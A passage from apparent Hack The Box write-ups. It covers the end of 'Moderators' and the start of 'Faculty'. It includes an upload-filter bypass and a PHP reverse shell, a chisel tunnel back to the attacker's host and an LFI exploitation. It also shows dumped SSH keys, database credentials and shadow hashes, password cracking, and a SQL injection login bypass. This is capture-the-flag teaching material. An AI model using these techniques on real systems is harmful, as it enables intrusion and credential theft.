\nce5d75028d92047a9ec617acb9c34ce6  -\n➜  moderators curl -v http://moderators.htb/logs/ce5d75028d92047a9ec617acb9c34ce6/ \n*   Trying 10.10.11.173:80...\n* Connected to moderators.htb (10.10.11.173) port 80 (#0)\n&gt; GET /logs/ce5d75028d92047a9ec617acb9c34ce6/ HTTP/1.1\n&gt; Host: moderators.htb\n&gt; User-Agent: curl/7.84.0\n&gt; Accept: */*\n&gt; \n* Mark bundle as not supporting multiuse\n&lt; HTTP/1.1 200 OK\n&lt; Date: Fri, 02 Sep 2022 12:08:50 GMT\n&lt; Server: Apache/2.4.41 (Ubuntu)\n&lt; Last-Modified: Wed, 24 Nov 2021 09:29:14 GMT\n&lt; ETag: \"0-5d1857dc949a9\"\n&lt; Accept-Ranges: bytes\n&lt; Content-Length: 0\n&lt; Content-Type: text/html\n&lt; \n* Connection #0 to host moderators.htb left intact\n8121:\n➜  moderators echo -n \"8121\" | md5sum  \nafecc60f82be41c1b52f6705ec69e0f1  -\n➜  moderators curl -v http://moderators.htb/logs/afecc60f82be41c1b52f6705ec69e0f1/\n*   Trying 10.10.11.173:80...\n* Connected to moderators.htb (10.10.11.173) port 80 (#0)\n&gt; GET /logs/afecc60f82be41c1b52f6705ec69e0f1/ HTTP/1.1\n&gt; Host: moderators.htb\n&gt; User-Agent: curl/7.84.0\n&gt; Accept: */*\n&gt; \n* Mark bundle as not supporting multiuse\n&lt; HTTP/1.1 200 OK\n&lt; Date: Fri, 02 Sep 2022 12:09:44 GMT\n&lt; Server: Apache/2.4.41 (Ubuntu)\n&lt; Last-Modified: Wed, 24 Nov 2021 09:29:14 GMT\n&lt; ETag: \"0-5d1857dc7e23f\"\n&lt; Accept-Ranges: bytes\n&lt; Content-Length: 0\n&lt; Content-Type: text/html\n&lt; \n* Connection #0 to host moderators.htb left intact\nNone of them contain any information..\n\n\nStep 2\nLets create a simple script to loop through 1 to 10000, create it’s corresponding md5 hash can send a GET request to /logs/. If len(response.text) is not equal to 0, print the result. Note that you can achieve the same thing by using ffuf or similar, but I though it would be fun to build a simple python script.\nBelow is the end result and it can be downloaded here.\n#!/usr/bin/env python3\n# by 0xPThree - exploit.se\nfrom colorama import Fore\nimport hashlib\nimport requests\nimport argparse\nimport time\n\nr = requests.session()\nstorage = []\n\ndef getUrl(target, md5sum):\n    # Send GET request\n    url = target + md5sum + \"/\"\n    req = r.get(url)\n    if req.status_code == 200: #and len(req.text) != 0:\n        print(\"Found something on:\", url)\n        storage.append(url)\n        return\n    else:\n        return\n\ndef createMd5(id):\n    md5sum = hashlib.md5(str(id).encode()).hexdigest()\n    return(md5sum)\n                                                                         \n\ndef main():\n    start = time.time()\n    formatter = lambda prog: argparse.HelpFormatter(prog,max_help_position=70)\n    parser = argparse.ArgumentParser(formatter_class=formatter)\n    parser.add_argument('-t','--target', type=str, help='target url')\n    parser.add_argument('-s','--start', type=int, help='start id')\n    parser.add_argument('-e','--end', type=int, help='end id')\n    args = parser.parse_args()\n\n    # Loop through start to end\n    for i in range(args.start, args.end):\n        print(\"Testing nr.\", i)\n        md5sum = createMd5(i)\n        getUrl(args.target, md5sum)\n\n    # Print all results stored in 'storage'\n    if not storage:\n        print(\"Nothing found..\")\n    else:\n        for i in range(len(storage)):\n            print(\"Results\", i, \"-\", storage[i])\n\n    end = time.time()\n    print(\"time elapsed:\", end - start, \"seconds\")\n\n    \nif __name__ == \"__main__\":\n    main()\nSadly running the script with start 1 and end 10000 doesn’t give us anything that we already knew..\n➜  moderators python3 findLogs.py -t http://moderators.htb/logs/ -s 1 -e 10000\nTesting nr. 1\n[... snip ...]\nTesting nr. 9999\nResults 0 - http://moderators.htb/logs/743c41a921516b04afde48bb48e28ce6/\nResults 1 - http://moderators.htb/logs/b071cfa81605a94ad80cfa2bbc747448/\nResults 2 - http://moderators.htb/logs/74d90aafda34e6060f9e8433962d14fd/\nResults 3 - http://moderators.htb/logs/ce5d75028d92047a9ec617acb9c34ce6/\nResults 4 - http://moderators.htb/logs/afecc60f82be41c1b52f6705ec69e0f1/\nResults 5 - http://moderators.htb/logs/e21cece511f43a5cb18d4932429915ed/\ntime elapsed: 435.2408220767975 seconds\nContinue to enumerate the found URLs with ffuf, and we find pdfs!\n➜  moderators ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://moderators.htb/logs/743c41a921516b04afde48bb48e28ce6/FUZZ.pdf\nlogs                    [Status: 200, Size: 15187, Words: 776, Lines: 239, Duration: 38ms]\n\n➜  moderators ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://moderators.htb/logs/b071cfa81605a94ad80cfa2bbc747448/FUZZ.pdf\nlogs                    [Status: 200, Size: 10059, Words: 754, Lines: 220, Duration: 29ms]\n\n➜  moderators ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://moderators.htb/logs/74d90aafda34e6060f9e8433962d14fd/FUZZ.pdf\nlogs                    [Status: 200, Size: 10059, Words: 754, Lines: 220, Duration: 65ms]\n\n➜  moderators ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://moderators.htb/logs/ce5d75028d92047a9ec617acb9c34ce6/FUZZ.pdf\nlogs                    [Status: 200, Size: 15042, Words: 771, Lines: 239, Duration: 36ms]\n\n➜  moderators ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://moderators.htb/logs/afecc60f82be41c1b52f6705ec69e0f1/FUZZ.pdf\nlogs                    [Status: 200, Size: 10059, Words: 754, Lines: 220, Duration: 30ms]\n\n➜  moderators ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://moderators.htb/logs/e21cece511f43a5cb18d4932429915ed/FUZZ.pdf\nlogs                    [Status: 200, Size: 10059, Words: 754, Lines: 220, Duration: 31ms]\nDownload all the log.pfd files:\n➜  moderators curl http://moderators.htb/logs/743c41a921516b04afde48bb48e28ce6/logs.pdf -o 2589-logs.pdf\n➜  moderators curl http://moderators.htb/logs/743c41a921516b04afde48bb48e28ce6/logs.pdf -o 3478-logs.pdf\n➜  moderators curl http://moderators.htb/logs/74d90aafda34e6060f9e8433962d14fd/logs.pdf -o 4221-logs.pdf\n➜  moderators curl http://moderators.htb/logs/ce5d75028d92047a9ec617acb9c34ce6/logs.pdf -o 7612-logs.pdf\n➜  moderators curl http://moderators.htb/logs/afecc60f82be41c1b52f6705ec69e0f1/logs.pdf -o 8121-logs.pdf\n➜  moderators curl http://moderators.htb/logs/e21cece511f43a5cb18d4932429915ed/logs.pdf -o 9798-logs.pdf\n\nWe find even more new paths, /logs/report_log_upload.php, a file upload!\n\n\n\nStep 3\nTrying to upload a php webshell is revoked with the text “Only PDF files are allowed!”, maybe we can bypass this with burp or maybe upload a malicious PDF.\nPlaying around with the function we can confirm that we’re able to upload PDF files: \nWe are not able to bypass the restriction by changing MIME type and/or file extension: \nHowever we are able to bypass it by adding %PDF-1.5 at the start of our payload, changing extension to .pdf.php and MIME type to application/pdf: \nBrowsing to the uploaded file, http://moderators.htb/logs/uploaded/&lt;filename&gt;, we quickly realize that our mini RCE doesn’t work..\n\nInstead of going for a webshell, lets go for a php reverse shell right away. The one from Pentestmonkey is usually my go to, and the one used here. \n\n\nStep 4\nEnumerate the box manually as user www-data. - We’re unable to run any commands as sudo - sudo -l - In /home/ we find two users - john and lexi - We got read and execute privileges in lexi’s home directory, however we’re unable to read user.txt and/or any file in .ssh\ndrwxrwx---  7 john john 4096 Jul 14 15:51 john\ndrwxr-xr-x  5 lexi lexi 4096 Jul 14 10:50 lexi\n\nMySQL is running locally on port 3306, however we don’t have any credentials to login, yet. And a local webserver (I guess) is running on port 8080\n\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \ntcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -    \n\nThere is nothing of use in /var/www/html\nWe find what seems to be a new version of the site under /opt/site.new/\n\nWe’re unable to read wp-config.php\nThere are two installed plugins, brandfolder & passwords-manager, found under /opt/site.new/wp-content/plugins\n\nRunning ps aux we can see that user lexi runs a script (/usr/local/sbin/startup.sh) to start the webserver in /opt/site.new/\n\n$ ps aux\nroot         822  0.0  0.0   8368  3748 ?        Ss   07:20   0:00 /usr/sbin/runuser -u lexi /usr/local/sbin/startup.sh\nlexi         865  0.0  0.0   2608   596 ?        S    07:20   0:00 /bin/sh /usr/local/sbin/startup.sh\nlexi         866  0.0  0.7 228360 31740 ?        S    07:20   0:00 /usr/bin/php -S 127.0.0.1:8080 -t /opt/site.new/\n\n$ cat /usr/local/sbin/startup.sh\n#!/bin/sh\n/usr/bin/php -S 127.0.0.1:8080 -t /opt/site.new/\nUpload chisel and setup a tunnel to start enumerate the local webservice. Note: Port 8080 collides with my proxy settings, so I need to close this before setting up chisel.\n# Start server locally\n➜  chisel_1.7.7 ./chisel_1.7.7_linux_amd64 server -p 4444 -reverse\n\n# Upload and run chisel client\nwww-data@moderators:/dev/shm$ wget http://10.10.14.5/chisel_1.7.7_linux_amd64\nwww-data@moderators:/dev/shm$ chmod +x chisel_1.7.7_linux_amd64\nwww-data@moderators:/dev/shm$ ./chisel_1.7.7_linux_amd64 client 10.10.14.5:4444 R:8080:127.0.0.1:8080\n2022/09/05 08:34:41 client: Connecting to ws://10.10.14.5:4444\n2022/09/05 08:34:41 client: Connected (Latency 27.873433ms)\nThe new site is a total mess, probably because it refers to moderators.htb which I’m to lazy to fix in /etc/hosts. \n\n\nStep 5\nGoogling around we find that the plugin brandfolder have a LFI/RFI vulnerability, we should be able to exploit this to run commands as user lexi.\nCopy a new php reverse shell to /dev/shm/, name it to wp-load.php as per instructions and browse to http://127.0.0.1:8080/wp-content/plugins/brandfolder/callback.php?wp_abspath=/dev/shm/ to trigger the reverse shell. And yes, the chisel tunnel needs to be up and running when triggering the reverse shell.\nwww-data@moderators:/dev/shm$ mv rev.php wp-load.php\n\n➜  moderators nc -lvnp 4499\nlistening on [any] 4499 ...\nconnect to [10.10.14.5] from (UNKNOWN) [10.10.11.173] 37260\n$ id && hostname\nuid=1001(lexi) gid=1001(lexi) groups=1001(lexi),1002(moderators)\nmoderators\n\n$ cat user.txt && cat .ssh/id_rsa\nabbfc3e262e116c1559b3a2a97bdc041\n-----BEGIN OPENSSH PRIVATE KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----\nDouble check that lexi’s id_rsa can be used for persistence before closing all reverse connections.\n➜  moderators vim lexi-id_rsa \n➜  moderators chmod 400 lexi-id_rsa\n➜  moderators ssh lexi@moderators.htb -i lexi-id_rsa\nlexi@moderators:~$\n\n\n\n\nROOT\n\nStep 1\nWe are now able to read wp-config.php:\nlexi@moderators:/opt/site.new$ cat wp-config.php\n[... snip ...]\n/** MySQL database username */\ndefine( 'DB_USER', 'wordpressuser' );\n\n/** MySQL database password */\ndefine( 'DB_PASSWORD', 'wordpresspassword123!!' );\n\n/** MySQL hostname */\ndefine( 'DB_HOST', 'localhost' );\nLook if there are any users in the SQL Database:\nlexi@moderators:/opt/site.new$ mysql -u wordpressuser -p\nEnter password: wordpresspassword123!!\nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\nYour MariaDB connection id is 40\nServer version: 10.3.34-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04\n\nMariaDB [(none)]&gt; show databases;\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| wordpress          |\n+--------------------+\n2 rows in set (0.001 sec)\n\nMariaDB [(none)]&gt; use wordpress;\nReading table information for completion of table and column names\nYou can turn off this feature to get a quicker startup with -A\n\nDatabase changed\nMariaDB [wordpress]&gt; show tables;\n+----------------------------+\n| Tables_in_wordpress        |\n+----------------------------+\n| wp_commentmeta             |\n| wp_comments                |\n| wp_links                   |\n| wp_options                 |\n| wp_pms_category            |\n| wp_pms_passwords           |\n| wp_postmeta                |\n| wp_posts                   |\n| wp_prflxtrflds_fields_meta |\n| wp_term_relationships      |\n| wp_term_taxonomy           |\n| wp_termmeta                |\n| wp_terms                   |\n| wp_usermeta                |\n| wp_users                   |\n| wp_wpfm_backup             |\n+----------------------------+\n16 rows in set (0.000 sec)\n\nMariaDB [wordpress]&gt; select * from wp_users;\n+----+------------+------------------------------------+---------------+----------------------+-------------------------+---------------------+---------------------+-------------+--------------+\n| ID | user_login | user_pass                          | user_nicename | user_email           | user_url                | user_registered     | user_activation_key | user_status | display_name |\n+----+------------+------------------------------------+---------------+----------------------+-------------------------+---------------------+---------------------+-------------+--------------+\n|  1 | admin      | $P$BXasOiM52pOUIRntJTPVlMoH0ZlntT0 | admin         | admin@moderators.htb | http://192.168.1.4:8080 | 2021-09-11 05:30:20 |                     |           0 | admin        |\n|  2 | lexi       | $P$BZ0Fj92qgnvg4F52r3lpwHejcXag461 | lexi          | lexi@moderators.htb  |                         | 2021-09-12 16:51:16 |                     |           0 | lexi         |\n+----+------------+------------------------------------+---------------+----------------------+-------------------------+---------------------+---------------------+-------------+--------------+\nWe’re unable to crack any of the hashes\n➜  moderators cat wp.hash                                                      \nadmin:$P$BXasOiM52pOUIRntJTPVlMoH0ZlntT0\nlexi:$P$BZ0Fj92qgnvg4F52r3lpwHejcXag461\n➜  moderators hashcat -a0 -m400 wp.hash /usr/share/wordlists/rockyou.txt --user\nInstead we investigate the possibility of changing the password for user admin. From the site useotools.com we write wanted password and are returned both the hash and also the SQL Query needed to update the table.\n\nMariaDB [wordpress]&gt; UPDATE `wp_users` SET `user_pass` = '$P$Butw21NZp/bVFKSgE6gbBKtLjkl3tQ/' WHERE user_login = 'admin';\nQuery OK, 1 row affected (0.002 sec)\nRows matched: 1  Changed: 1  Warnings: 0\n\nMariaDB [wordpress]&gt; select * from wp_users;\n[... snip ...]\n|  1 | admin      | $P$Butw21NZp/bVFKSgE6gbBKtLjkl3tQ/ \nSet up a new SSH tunnel and login through http://127.0.0.1:8080/wp-login.php. Trying to login we’re forwarded to http://moderators.htb:8080/xxx and trying to edit moderators.htb to 127.0.0.1 invalidate the login. So edit /etc/hosts and add moderators.htb to 127.0.0.1.\nTry to login again and everything works as intended: \n\n\nStep 2\nAt the bottom of the nav bar we find the second plugin “PWDMS”, check it out and we find the credentials carl:Carl@thebest** as well as john’s private SSH key..\n\nCopy the private key and re-format it, myself I use samltool.com for this purpose.\n➜  moderators vim john-id_rsa \n➜  moderators chmod 400 john-id_rsa               \n➜  moderators ssh john@10.10.11.173 -i john-id_rsa\njohn@moderators:~$ id\nuid=1000(john) gid=1000(john) groups=1000(john),1002(moderators)\nDoing some manual enumeration as john we find internal conversation logs talking about password policies and vbox etc:\njohn@moderators:~/stuff/exp$ strings *\nWe find the encrypted .vdi as well as the informational .vbox files:\njohn@moderators:~/stuff/VBOX$ ls -al\ntotal 118800\ndrwxr-xr-x 2 john john      4096 Jul 14 10:50 .\ndrwxr-xr-x 4 john john      4096 Jul 14 10:50 ..\n-rwxr-xr-x 1 john john      5705 Sep 18  2020 2019-08-01.vbox\n-rwxr-xr-x 1 john john 121634816 Sep 18  2020 2019.vdi\n\njohn@moderators:~/stuff/VBOX$ cat 2019-08-01.vbox\n[... snip ...]\n&lt;VirtualBox xmlns=\"http://www.virtualbox.org/\" version=\"1.16-windows\"&gt;\n  &lt;Machine uuid=\"{528b3540-b8be-4677-b43f-7f4969137747}\" name=\"Moderator 1\" OSType=\"Ubuntu_64\" snapshotFolder=\"Snapshots\" lastStateChange=\"2021-09-15T16:44:57Z\"&gt;\n    &lt;MediaRegistry&gt;\n      &lt;HardDisks&gt;\n        &lt;HardDisk uuid=\"{12b147da-5b2d-471f-9e32-a32b1517ff4b}\" location=\"F:/2019.vdi\" format=\"VDI\" type=\"Normal\"&gt;\n          &lt;Property name=\"CRYPT/KeyId\" value=\"Moderator 1\"/&gt;\n          &lt;Property name=\"CRYPT/KeyStore\" value=\"U0NORQABQUVTLVhUUzI1Ni1QTEFJTjY0AAAAAAAAAAAAAAAAAABQQktERjItU0hB&#13;&#10;MjU2AAAAAAAAAAAAAAAAAAAAAAAAAEAAAABUQgV7yASjqRRgfezqVXSqcDjNzg1J&#13;&#10;jH/ENK/ozVskTyAAAADpYIvN2MBwhohZoxyfHl5d6YterYwh8lwMQ+5peBbjLCBO&#13;&#10;AABUYpGmB0lDsJbqgNsq451Bed5tHD8X6iXWLmJ6v6f7y2A9CABAAAAAo4alQy6T&#13;&#10;jyDI+8mvRgp4wXkMGavRxR6cC+ckk5yUgVhhgPxKNBNdhIHkNtjBMrj0uaVQ3ksk&#13;&#10;gwC6MrGLZFhl1g==\"/&gt;\nThe KeyStore seems interesting, and investigating we quickly find that we can crack it using pyvboxdie-cracker:\n➜  pyvboxdie-cracker git:(master) ✗ python3 pyvboxdie-cracker.py -v /htb/moderators/2019-08-01.vbox -d wordlist.txt                   \nStarting pyvboxdie-cracker...\n\n[*] Encrypted drive found :  F:/2019.vdi\n[*] KeyStore information...\n    Algorithm = AES-XTS256-PLAIN64\n    Hash = PBKDF2-SHA256\n    Final Hash = 5442057bc804a3a914607decea5574aa7038cdce0d498c7fc434afe8cd5b244f\n\n[*] Starting bruteforce...\n    19 password tested...\n    49 password tested...\n    67 password tested...\n\n[*] Password Found = computer\n\n\nStep 3\nDownload the .vdi to your local machine and VirtualBox if you don’t already have it. I use my Windows box where I have VirtualBox already installed. Add the .vbox file to create the new machine “Moderator 1”. In the settings status we see that it’s missing Ubuntu.vdi and 2019.vdi:\n\nInstead of removing and adding new drives, open remove the machine Moderator 1 and edit 2019-08-01.vbox, change the location of the disks to whatever suits you.\n      &lt;HardDisks&gt;\n        &lt;HardDisk uuid=\"{12b147da-5b2d-471f-9e32-a32b1517ff4b}\" location=\"D:\\2019.vdi\" format=\"VDI\" type=\"Normal\"&gt;\n        [... snip ...]\n        &lt;HardDisk uuid=\"{5999a8f0-e31d-4d4e-937d-173eb6ba8881}\" location=\"Ubuntu.vdi\" format=\"VDI\" type=\"Normal\"/&gt;\n      &lt;/HardDisks&gt;\n      &lt;DVDImages&gt;\n        &lt;Image uuid=\"{7653d755-c513-4004-8891-be83fc130dba}\" location=\"D:\\ubuntu-22.04-desktop-amd64.iso\"/&gt;\n      &lt;/DVDImages&gt;\nAdd the machine again and it should now detect 2019.vdi, if it doesn’t you may need to restart VirtualBox.\n\nWe’re still not able to start the box, because of this Ubuntu.vdi, so lets just remove it from the 2019-08-01.vbox file.. delete these line:\n&lt;HardDisk uuid=\"{5999a8f0-e31d-4d4e-937d-173eb6ba8881}\" location=\"Ubuntu.vdi\" format=\"VDI\" type=\"Normal\"/&gt;\n[... snip ...]\n  &lt;DVDImages&gt;\n    &lt;Image uuid=\"{7653d755-c513-4004-8891-be83fc130dba}\" location=\"F:/ubuntu-22.04-desktop-amd64.iso\"/&gt;\n  &lt;/DVDImages&gt;\n[... snip ...]\n    &lt;AttachedDevice type=\"HardDisk\" hotpluggable=\"false\" port=\"0\" device=\"0\"&gt;\n      &lt;Image uuid=\"{5999a8f0-e31d-4d4e-937d-173eb6ba8881}\"/&gt;\n    &lt;/AttachedDevice&gt;\nI was stuck here for a while, even when mounting a new ubuntu ISO and booting I got nowhere.. then I remembered the disk is crypted, but already we have the password - computer Add it to the configurations and try again. Note that you need VirtualBox Extension Pack to be able to edit this..\n\nNow when booting we’re able to choose “Try or Install Ubuntu”: \n\nRunning fdisk -l and df -h we see that /dev/sda is not mounted, this is our disk 2019.vdi. Mount it!\nubuntu@ubuntu:~$ sudo fdisk -l\n[... snip ...]\nDisk model: VBOX HARDDISK\n\nubuntu@ubuntu:~$ df -h\nubuntu@ubuntu:~$ sudo mount /dev/sda /tmp\nmount: /tmp: unknown filesystem type 'crypto_LUKS'\n\n\n\nStep 4\nLooking for ways to handle the LUKS encryption I find a few brute force tools, download and install bruteforce-luks on the Virtual Box VM and get at it. Very quickly we get the password - abc123\n\nThe disk only contains a directory named scripts, and within a set of subfolders. In the directory all-in-one there is one script with a timestamp that’s not like the others - distro_update.sh Look in the script and we find a password, probably for user john - $_THE_best_Sysadmin_Ever_\n\njohn@moderators:~/stuff/VBOX$ sudo su\n[sudo] password for john: $_THE_best_Sysadmin_Ever_\n\nroot@moderators:/home/john/stuff/VBOX# id && cat /root/root.txt && cat /etc/shadow\nuid=0(root) gid=0(root) groups=0(root)\nfa3a5c96cf4976a1d91f804c6372e3db\nroot:$6$aqIOGu.rJRXjVGgt$lN7qDpHZdrBxEcRi4VxcJt4dpNXwmxLsO7mTliULzPVcJyy5OPxLP3SmvgcprzkeZLbX.lPrqEg3JYYyV3Ayo0:19021:0:99999:7:::\njohn:$6$PK0A253j816qSMhV$4Oy/1b8vR6K1XDcvBMzAVZn.MOVLiBWDHOugQorKdhVBnbi1o.fSKcSzrltl9z7hiGekw6bkt18XH14e0ALTC0:18890:0:99999:7:::\nlexi:$6$IXHONvrvfEmCO7dH$banmCiCTcf7rcYWQr7jn3GkYeRpfQYWxafrlhhpcpdOfqkMwBEpFXVinENnfhEa3EdiE92v30PBhp6GqF6w67/:18890:0:99999:7:::"
  },
  {
    "objectID": "posts/2022-08-26-htb-writeup-faculty/2022-08-26-htb-writeup-faculty.html",
    "href": "posts/2022-08-26-htb-writeup-faculty/2022-08-26-htb-writeup-faculty.html",
    "title": "Faculty - Hack The Box",
    "section": "",
    "text": "USER\n\nStep 1\nnmap:\n➜  faculty nmap -Pn -n -p- 10.10.11.169\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\n➜  faculty nmap -Pn -n -p22,80 -sCV 10.10.11.169\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 e9:41:8c:e5:54:4d:6f:14:98:76:16:e7:29:2d:02:16 (RSA)\n|   256 43:75:10:3e:cb:78:e9:52:0e:eb:cf:7f:fd:f6:6d:3d (ECDSA)\n|_  256 c1:1c:af:76:2b:56:e8:b3:b8:8a:e9:69:73:7b:e6:f5 (ED25519)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://faculty.htb\n|_http-server-header: nginx/1.18.0 (Ubuntu)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\ndirb:\n==&gt; DIRECTORY: http://faculty.htb/admin/\n\nhttp://10.10.11.169 forwards to http://faculty.htb, add to /etc/hosts\n\n\nTesting a Faculty ID we see in Burp that it’s vulnerable to SQL Injection. \n\nLook for a authentication bypass variable.\nRequest: id_no=1337'\nResponse: 3\n\nRequest: id_no=1337'or 1=1#\nResponse: 1\nTest id_no=1337'or 1=1# as Faculty ID on the webpage and we successfully bypass the login mechanism and are met with a scheduling system for user Smith, John C. \nWe can’t do anything, to my knowledge, on this scheduling system but if we visit http://faculty.htb/admin our PHPSESSID cookie is carried over and we login as use Smith, John C. Looking around the page we find Faculty List containing two other users; Blake Claire G, cblake@faculty.htb and James, Eric P, ejames@faculty.htb as well as John’s email address jsmith@faculty.htb with their corresponding ID No.\n\nFuzzing the URL parameter we find a new end point, users:\n➜  byp4xx git:(main) ✗ ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://faculty.htb/admin/index.php\\?page\\=FUZZ -b \"PHPSESSID=6nhsugkb63bt2hf68uf76c846d\" -fw 2641\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.5.0 Kali Exclusive &lt;3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://faculty.htb/admin/index.php?page=FUZZ\n :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt\n :: Header           : Cookie: PHPSESSID=6nhsugkb63bt2hf68uf76c846d\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500\n :: Filter           : Response words: 2641-2645\n________________________________________________\n\ncourses                 [Status: 200, Size: 20137, Words: 2007, Lines: 534, Duration: 35ms]\nfaculty                 [Status: 200, Size: 19455, Words: 1953, Lines: 534, Duration: 35ms]\nschedule                [Status: 200, Size: 16477, Words: 2273, Lines: 517, Duration: 53ms]\nsubjects                [Status: 200, Size: 21202, Words: 2008, Lines: 548, Duration: 69ms]\nusers                   [Status: 200, Size: 12514, Words: 1685, Lines: 386, Duration: 97ms]\n\nHere we find user admin. We are unable to edit the user, nor can we create a new user by pressing the blue button (nothing happens). Looking in the source code it seems to be connected to manage_users.php but all actions are cropped.\n&lt;script&gt;\n    